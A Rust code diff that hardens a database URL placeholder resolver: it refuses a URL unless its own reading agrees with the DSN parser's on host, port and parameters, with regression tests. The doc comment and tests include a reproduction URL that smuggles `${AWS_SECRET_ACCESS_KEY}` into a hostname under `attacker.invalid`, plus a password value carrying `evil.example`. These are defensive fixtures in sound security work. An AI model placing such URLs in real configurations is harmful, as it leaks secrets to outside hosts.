@@ -469,28 +469,36 @@ impl UrlResolution {
 /// `${PREFIX}//host/db` — has no identifiable host component, so *every*
 /// placeholder in it is treated as host-tainting. Same for a
 /// placeholder in the scheme.
+///
+/// Finally, whatever this function decided, `conn::Dsn::parse` gets the
+/// last word — because it is the parser's reading that gets connected
+/// to. This function finds the authority by cutting at the first `/`,
+/// `?` or `#`; the parser (`split_authority`) cuts at the *last* `@`
+/// before the query, so that a password may carry `/` and `@`
+/// unescaped. Two rules, two answers:
+/// `jdbc:postgresql://x@db.example/app@${SECRET}.attacker.invalid:55432/db`
+/// had an empty `in_host` here (the placeholder sat in "the path") and a
+/// host of `<secret>.attacker.invalid` there, and the environment
+/// variable left the machine as a DNS lookup. So after resolving, both
+/// the template (placeholders left literal) and the result are parsed
+/// as DSNs, and the URL is refused outright unless the two agree byte
+/// for byte on host, port, params and `ssh_tunnel` and the template's
+/// host holds no `${` ([`authority_agrees_with_parser`]). A parse
+/// failure on either side refuses too — fail closed.
 pub fn resolve_url_placeholders(
     url: &str,
     lookup: impl Fn(&str) -> Option<String>,
 ) -> UrlResolution {
     // No parseable authority → the whole string could become a host.
     let Some(scheme_end) = url.find("://") else {
-        return UrlResolution {
-            value: url.to_string(),
-            missing: Vec::new(),
-            in_host: placeholder_bodies(url),
-        };
+        return refuse_whole_url(url);
     };
     let authority_start = scheme_end + 3;
     let scheme = &url[..authority_start];
     if scheme.contains("${") {
         // `${SCHEME}://…` — we can't reason about what the resolved
         // text would make the authority, so refuse the lot.
-        return UrlResolution {
-            value: url.to_string(),
-            missing: Vec::new(),
-            in_host: placeholder_bodies(url),
-        };
+        return refuse_whole_url(url);
     }
     let rest = &url[authority_start..];
     let authority_len = rest.find(['/', '?', '#']).unwrap_or(rest.len());
@@ -538,16 +546,67 @@ pub fn resolve_url_placeholders(
     if introduces_url_structure(userinfo, &resolved_userinfo)
         || introduces_url_structure(path, &resolved_path)
     {
-        return UrlResolution {
-            value: url.to_string(),
-            missing: Vec::new(),
-            in_host: placeholder_bodies(url),
-        };
+        return refuse_whole_url(url);
+    }
+    let value = format!("{scheme}{resolved_userinfo}{hostport}{resolved_path}{params}");
+    // The parser gets the last word on where the host is (see the doc
+    // comment). Only when there was something to resolve: with
+    // `in_host` already non-empty the URL is refused and its host left
+    // literal, and with no `${` at all there is nothing to disagree
+    // about.
+    if in_host.is_empty() && url.contains("${") && !authority_agrees_with_parser(url, &value) {
+        return refuse_whole_url(url);
     }
     UrlResolution {
-        value: format!("{scheme}{resolved_userinfo}{hostport}{resolved_path}{params}"),
+        value,
         missing,
         in_host,
+    }
+}
+
+/// Refuse `url` as a whole: the value stays the literal text and every
+/// placeholder body in it is reported in `in_host`, so no half-resolved
+/// string can be connected to.
+fn refuse_whole_url(url: &str) -> UrlResolution {
+    UrlResolution {
+        value: url.to_string(),
+        missing: Vec::new(),
+        in_host: placeholder_bodies(url),
+    }
+}
+
+/// The components of a URL a placeholder may never choose, as
+/// `conn::Dsn::parse` reads them: host, port, params (where `sslmode=`
+/// and `ssh_tunnel=` live) and the tunnel parsed out of them.
+type ParserAuthority = (
+    String,
+    u16,
+    Vec<(String, String)>,
+    Option<crate::tunnel::SshTunnelSpec>,
+);
+
+/// [`ParserAuthority`] of `url`, or `None` when the parser cannot read
+/// it. A `jdbc:` prefix is stripped first — that is the form Spring and
+/// IntelliJ carry, and `conn::Dsn::parse` wants the bare scheme.
+fn parser_authority(url: &str) -> Option<ParserAuthority> {
+    let bare = url.strip_prefix("jdbc:").unwrap_or(url);
+    let d = crate::conn::Dsn::parse(bare).ok()?;
+    Some((d.host, d.port, d.params, d.ssh_tunnel))
+}
+
+/// `true` when `conn::Dsn::parse` reads the same host, port, params and
+/// tunnel out of `template` (placeholders left literal) and `resolved`,
+/// and the template's host holds no `${`. Anything else — either side
+/// failing to parse included — is `false` and the caller refuses the
+/// URL. This is the check that catches a placeholder
+/// [`resolve_url_placeholders`] placed in the path or userinfo but the
+/// parser places in the host: the two find the authority by different
+/// rules (first `/` here, last `@` there), and what gets connected to is
+/// the parser's reading.
+fn authority_agrees_with_parser(template: &str, resolved: &str) -> bool {
+    match (parser_authority(template), parser_authority(resolved)) {
+        (Some(t), Some(r)) => !t.0.contains("${") && t == r,
+        _ => false,
     }
 }
 
@@ -1240,6 +1299,93 @@ dataSource:
             resolve_url_placeholders("jdbc:postgresql://h:5432/app?sslmode=require", |_| None);
         assert!(got.is_clean());
         assert_eq!(got.value, "jdbc:postgresql://h:5432/app?sslmode=require");
+    }
+
+    /// The security-review reproduction: this resolver cut the authority
+    /// at the first `/` and saw the placeholder in the path;
+    /// `conn::Dsn::parse` cuts at the last `@` and saw it as the host.
+    const PARSER_DISAGREEMENT_URL: &str =
+        "jdbc:postgresql://x@db.example/app@${AWS_SECRET_ACCESS_KEY}.attacker.invalid:55432/db";
+
+    #[test]
+    fn resolve_url_placeholders_refuses_a_placeholder_the_parser_reads_as_the_host() {
+        let got = resolve_url_placeholders(PARSER_DISAGREEMENT_URL, |n| {
+            (n == "AWS_SECRET_ACCESS_KEY").then(|| "LEAKED".to_string())
+        });
+        assert_eq!(
+            got.in_host,
+            vec!["AWS_SECRET_ACCESS_KEY".to_string()],
+            "must be refused as host-tainting: {got:?}"
+        );
+        assert_eq!(
+            got.value, PARSER_DISAGREEMENT_URL,
+            "a refused URL keeps its literal text"
+        );
+        assert!(!got.value.contains("LEAKED"));
+        assert!(!got.is_clean());
+    }
+
+    #[test]
+    fn resolve_url_placeholders_still_resolves_userinfo_and_dbname_beside_params() {
+        // The benign shape every Spring project has, with the two params
+        // the cross-check compares byte for byte.
+        let got = resolve_url_placeholders(
+            "jdbc:postgresql://${DB_USER}:${DB_PASSWORD}@db.internal:5432/${DB_NAME}\
+             ?sslmode=require&ssh_tunnel=tom@bastion",
+            |n| match n {
+                "DB_USER" => Some("svc".into()),
+                "DB_PASSWORD" => Some("s3cret".into()),
+                "DB_NAME" => Some("orders".into()),
+                _ => None,
+            },
+        );
+        assert!(got.is_clean(), "unexpected: {got:?}");
+        assert_eq!(
+            got.value,
+            "jdbc:postgresql://svc:s3cret@db.internal:5432/orders\
+             ?sslmode=require&ssh_tunnel=tom@bastion"
+        );
+    }
+
+    #[test]
+    fn resolve_url_placeholders_refuses_a_password_that_resolves_to_hold_an_at() {
+        // An `@` in the password moves the parser's userinfo/host split:
+        // `svc:p@evil.example@db.internal` still parses to `db.internal`
+        // today, but the value has changed the authority's shape and the
+        // structural check refuses it before the parser is even asked.
+        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal:5432/orders";
+        let got = resolve_url_placeholders(url, |n| {
+            (n == "DB_PASSWORD").then(|| "p@evil.example".to_string())
+        });
+        assert!(!got.is_clean(), "must be refused: {got:?}");
+        assert_eq!(got.in_host, vec!["DB_PASSWORD".to_string()]);
+        assert_eq!(got.value, url);
+        assert!(!got.value.contains("evil"));
+    }
+
+    #[test]
+    fn resolve_url_placeholders_refuses_a_template_the_parser_cannot_read() {
+        // Fail closed: a template `conn::Dsn::parse` cannot read is one
+        // it cannot vouch for, however this resolver placed the
+        // placeholder.
+        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal:notaport/orders";
+        let got = resolve_url_placeholders(url, |_| Some("x".to_string()));
+        assert_eq!(got.in_host, vec!["DB_PASSWORD".to_string()]);
+        assert_eq!(got.value, url);
+    }
+
+    #[test]
+    fn resolve_url_placeholders_a_colon_in_the_password_stays_in_the_userinfo() {
+        // `:` is not a structural character, and the parser splits the
+        // userinfo on its *first* `:` — so the value stays a password and
+        // the cross-check must not mistake it for a port.
+        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal/orders";
+        let got = resolve_url_placeholders(url, |_| Some("p:99".to_string()));
+        assert!(
+            got.is_clean(),
+            "a `:` in the password stays in the userinfo: {got:?}"
+        );
+        assert_eq!(got.value, "jdbc:postgresql://svc:p:99@db.internal/orders");
     }
 
     #[test]
